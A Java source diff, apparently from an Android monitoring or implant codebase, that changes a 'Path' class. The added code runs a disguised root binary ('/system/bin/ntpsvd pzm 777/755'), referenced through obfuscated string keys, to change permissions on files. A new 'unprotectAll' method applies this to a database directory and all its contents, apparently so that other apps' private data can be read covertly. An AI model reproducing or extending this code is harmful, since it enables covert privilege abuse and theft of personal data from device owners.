@@ -230,20 +230,26 @@ public class Path {
 
 	public static boolean unprotect(String path, boolean fullmode) {
 		try {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
-			}
+			
 			File file = new File(path);
 
 			if (fullmode) {
 				if (file.canRead() && file.canWrite()) {
 					return true;
 				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (unprotect): " + Messages.getString("h_9") + path);
+				}
+				//h_9=/system/bin/ntpsvd pzm 777 
 				Runtime.getRuntime().exec(Messages.getString("h_9") + path);
 			} else {
 				if (file.canRead()) {
 					return true;
 				}
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
+				}
+				//h_3=/system/bin/ntpsvd pzm 755 
 				Runtime.getRuntime().exec(Messages.getString("h_3") + path);
 			}
 
@@ -260,6 +266,18 @@ public class Path {
 		unprotect(file.getAbsolutePath(), fullMode);
 
 		return (file.canRead());
+	}
+	
+	public static boolean unprotectAll(String dbDir, boolean fullMode) {
+		File dir = new File(dbDir);
+		if(dir.isDirectory()){
+			unprotect(dbDir, fullMode);
+			for(String name: dir.list()){
+				File file=new File(dir,name);
+				unprotect(file.getAbsolutePath(), fullMode);
+			}
+		}
+		return (dir.canRead());
 	}
 
 	/**
